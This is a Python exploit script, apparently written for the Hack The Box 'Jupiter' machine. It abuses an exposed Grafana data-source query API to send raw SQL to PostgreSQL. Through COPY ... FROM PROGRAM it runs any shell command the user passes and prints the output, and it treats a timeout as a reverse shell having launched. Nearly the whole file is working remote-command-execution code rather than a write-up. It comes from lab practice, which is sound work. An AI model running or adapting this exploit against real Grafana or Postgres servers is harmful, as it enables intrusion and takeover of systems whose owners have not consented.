#!/usr/bin/env python3

'''
Jupiter HTB (SQLi)
------------------
Description: Exposed Grafana API query (postgres)
Author: Marss
Repository: https://github.com/E1P0TR0
Date: 07 Sep, 2023
'''

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from json import loads
from random import choices
from requests import get, post
from requests.exceptions import ConnectionError, ConnectTimeout, ReadTimeout
from signal import signal, SIGINT
from string import ascii_letters
from sys import argv


# Debugging
import pdb

# Ctrl + c
signal(SIGINT, lambda signum, frame: exit('\n[-] User aborted'))

# Main class
class Exploit:

    get_rand_str = lambda self, length: ''.join(choices(ascii_letters, k=length))

    def __init__(self, args):
        
        self.args = args
        self.target = {'domain_url':'http://kiosk.jupiter.htb'}

    def run(self):
        
        if self.target_response():
            
            self.search_datasource()
            
            table_name = self.get_rand_str(5)
            self.send_postgres_query(f'DROP TABLE IF EXISTS {table_name};')
            self.send_postgres_query(f'CREATE TABLE {table_name}(cmd_out text);')
            self.send_postgres_query(f'COPY {table_name} FROM PROGRAM \'{self.args.command}\';')
            self.send_postgres_query(f'SELECT * FROM {table_name};', output=True)
            self.send_postgres_query(f'DROP TABLE IF EXISTS {table_name};')

    def target_response(self):

        try:
            response = get(self.target['domain_url'], timeout=5)

            if response.ok:
                print(f'\n[+] Target up: {response.url}')

            return response.ok

        except ConnectTimeout:
            exit('\n[!] Verify VPN connection.')

        except ConnectionError:
            print(f'\n[x] Cannor resolve: {self.target["domain_url"]}')
            exit('[!] Check the machine connection or resolve the specific domain on your local DNS server (/etc/hosts).')

    def send_postgres_query(self, query, output=False):

        try:
            print(f'[+] Sending query: {query}')

            post_data = {
                'queries':[
                    {
                        'refId':'A',
                        'datasource':{
                            'uid': self.target['ds_uid']
                        },
                        'format':'table',
                        'rawSql': query
                    }
                ]
            }
            response = post(self.target['domain_url'] + '/api/ds/query',
                json=post_data,
                timeout=5)

            if response.status_code != 200:
                exit('\n[x] API response failed.')

            if not output:
                if int(loads(response.text)['results']['A']['status']) == 200:
                    print(f'[+] Query executed!')
                else:
                    exit('\n[x] Query failed.')
            else:
                query_response = loads(response.text)['results']['A']['frames'][0]['data']['values'][0]
                for line in query_response:
                    print(f'\n{line}', end='')
                print('\n')
        
        except ReadTimeout:
            exit('\n[+] Reverse shell executed.')
        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def search_datasource(self):

        response = get(self.target['domain_url'] + '/api/datasources')
        
        if response.status_code != 200:
            exit('\n[x] API request failed.')

        datasources = loads(response.text)
        for datasource in datasources:
            if datasource['type'] == 'postgres':
                self.target['ds_uid'] = datasource['uid']
            else:
                exit('\n[x] No valid datasource found')

# Main flow
if __name__ == '__main__':

    title = '| Jupiter HTB (SQLi) |'

    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        epilog=f'''Example:
        python3 {argv[0]} -c "id"
        ''')

    parser.add_argument('-c', '--command', required=True, type=str, help='Command to execute')

    args = parser.parse_args()

    print(title)

    exploit = Exploit(args)
    exploit.run()